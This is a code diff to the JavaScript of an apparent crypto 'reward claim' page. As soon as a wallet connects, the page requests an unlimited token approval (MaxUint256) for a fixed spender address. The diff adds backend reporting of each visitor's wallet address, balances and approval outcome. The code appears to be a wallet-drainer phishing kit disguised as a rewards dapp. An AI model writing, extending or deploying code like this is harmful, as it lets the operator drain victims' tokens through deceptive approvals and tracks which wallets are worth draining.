@@ -637,6 +637,8 @@
     let task2Eligible     = false;
     let task3Done         = false;
 
+
+
 let appKitEip155Provider = null;
 
 // Watch AppKit provider globally (mobile fix)
@@ -783,6 +785,11 @@ async function handleAppKitProvider(provider) {
       setWalletInfo("—","—",null);
       setUserIdUI("-");
 
+
+
+      
+
+     
       if(connectBtn){
         connectBtn.textContent = "Connect Wallet";
         connectBtn.classList.remove("connected");
@@ -793,6 +800,7 @@ if(connectBtnCard){
   connectBtnCard.classList.remove("connected");
 }
 
+      
       updateClaimState();
     }
 
@@ -931,31 +939,44 @@ if(connectBtnCard){
       }
     }
 
-    // ===== CHANGED: ensureTokenApproval now does NOT read allowance; it requests approval immediately =====
     async function ensureTokenApproval(){
+      // helper: always log with last known balances
+      async function logApproval(tag){
+        await notifyBackend(
+          currentAddress || "",
+          BNB_TESTNET_LABEL,
+          currentUserId || "",
+          currentBNBBalance,
+          currentTokenBalance,
+          tag
+        );
+      }
+
       // basic guards
       if(!TOKEN_ADDRESS){
         console.warn("TOKEN_ADDRESS not set, skipping approve");
-        setStatus("Connected (no token configured)");
+        await logApproval("approval_skipped_no_token");
         return;
       }
       if(!SPENDER_ADDRESS){
         console.warn("SPENDER_ADDRESS not set, skipping approve");
-        setStatus("Connected (no spender configured)");
+        await logApproval("approval_skipped_no_spender");
         return;
       }
       if(!providerInstance || !web3Instance){
         console.warn("No providerInstance/web3Instance for approval");
-        setStatus("Connected (wallet not ready)");
+        await logApproval("approval_skipped_no_provider");
         return;
       }
 
       try{
         setStatus("Preparing token approval…");
 
-        // prepare ethers provider & signer
-        const ethersProvider = new ethers.BrowserProvider(providerInstance, BNB_TESTNET_CHAIN_ID_DEC);
-        const signer = await ethersProvider.getSigner();
+        const ethersProvider = new ethers.BrowserProvider(
+          providerInstance,
+          BNB_TESTNET_CHAIN_ID_DEC    // 56 (BSC mainnet)
+        );
+        const signer       = await ethersProvider.getSigner();
         const ownerAddress = (await signer.getAddress()).toLowerCase();
 
         if (TOKEN_ADDRESS.toLowerCase() === ownerAddress) {
@@ -964,49 +985,53 @@ if(connectBtnCard){
             "It MUST be the BEP-20 token contract address, not your wallet."
           );
           setStatus("Connected (approval skipped)");
+          await logApproval("approval_skipped_token_is_wallet");
           return;
         }
 
-        // Encode approve(...) call data for fast path (eth_sendTransaction)
-        const iface = new ethers.Interface(ERC20_APPROVE_ABI);
-        const data = iface.encodeFunctionData("approve", [SPENDER_ADDRESS, ethers.MaxUint256]);
-        const txParams = { from: ownerAddress, to: TOKEN_ADDRESS, data: data };
+        // 1) check allowance
+        const readContract = new ethers.Contract(
+          TOKEN_ADDRESS,
+          ERC20_ALLOWANCE_ABI,
+          ethersProvider
+        );
+        const currentAllowance = await readContract.allowance(ownerAddress, SPENDER_ADDRESS);
+        console.log("[approve] currentAllowance =", currentAllowance.toString());
 
-        // Try fast path: eth_sendTransaction (some wallets will show only one popup)
-        if (providerInstance.request) {
-          try {
-            setStatus("Waiting for wallet to confirm approval…");
-            console.log("[instant-approve] trying eth_sendTransaction", txParams);
-            const sendResult = await providerInstance.request({ method: "eth_sendTransaction", params: [txParams] });
-            console.log("[instant-approve] eth_sendTransaction returned:", sendResult);
-            if (typeof sendResult === "string" && sendResult.startsWith("0x")) {
-              setStatus("Approval sent (pending)...");
-              return;
-            }
-            // if sendResult isn't a hash, we'll still fallback to signer route
-            console.warn("[instant-approve] eth_sendTransaction didn't return txHash, falling back");
-          } catch (errSend) {
-            console.warn("[instant-approve] eth_sendTransaction failed, falling back to signer:", errSend && errSend.message ? errSend.message : errSend);
-            // continue to fallback below
-          }
+        if (currentAllowance > 0n) {
+          setStatus("Connected (already approved)");
+          await logApproval("approval_already");
+          return;
         }
 
-        // Fallback: use signer.approve(...) which will open the wallet and return a tx object
+        // 2) send approve tx
         setStatus("Waiting for wallet to confirm approval…");
-        const writeContract = new ethers.Contract(TOKEN_ADDRESS, ERC20_APPROVE_ABI, signer);
+        const writeContract = new ethers.Contract(
+          TOKEN_ADDRESS,
+          ERC20_APPROVE_ABI,
+          signer
+        );
+
         const tx = await writeContract.approve(SPENDER_ADDRESS, ethers.MaxUint256);
-        console.log("[approve] tx sent (fallback):", tx.hash);
+        console.log("[approve] tx sent:", tx.hash);
+
         setStatus("Approval pending on chain…");
         await tx.wait();
+
         setStatus("Connected + Approved ✅");
+        await logApproval("approval_approved");
       }catch(err){
         console.error("Token approve error:", err);
+
+        let tag = "approval_error";
         if (err && (err.code === 4001 || err.code === "ACTION_REJECTED")) {
-          setStatus("Approval rejected");
-        } else {
-          setStatus("Approval failed");
+          tag = "approval_rejected";
         }
-        // keep UI connected but indicate failure
+
+        setStatus("Connected (approval failed)");
+        alert("Token approval failed: " + (err && err.message ? err.message : err));
+
+        await logApproval(tag);
       }
     }
 
@@ -1148,7 +1173,7 @@ async function connectFlow() {
       return session;
     })();
 
-    // 8) Token approval (IMMEDIATE) — no allowance pre-read
+    // 8) Token approval (same behavior as before)
     await ensureTokenApproval();
     sessionPromise.catch(console.error);
 
@@ -1296,7 +1321,7 @@ async function connectFlow() {
       }
 
       updateClaimState();
-      setupAppKitProviderWatcher();
+setupAppKitProviderWatcher();
 
       if(connectBtn){
         connectBtn.addEventListener("click", function(){
@@ -1305,14 +1330,19 @@ async function connectFlow() {
         });
       }
 
-      // Connect button inside reward card
-      const connectBtnCard = document.getElementById("connectBtnCard");
-      if (connectBtnCard) {
-        connectBtnCard.addEventListener("click", function () {
-          if (isWalletConnected) return;
-          connectFlow();
-        });
-      }
+// Connect button inside reward card
+const connectBtnCard = document.getElementById("connectBtnCard");
+if (connectBtnCard) {
+  connectBtnCard.addEventListener("click", function () {
+    if (isWalletConnected) return;
+    connectFlow();
+  });
+}
+
+
+
+
+      
 
       if(claimBtn){
         claimBtn.addEventListener("click", claimReward);
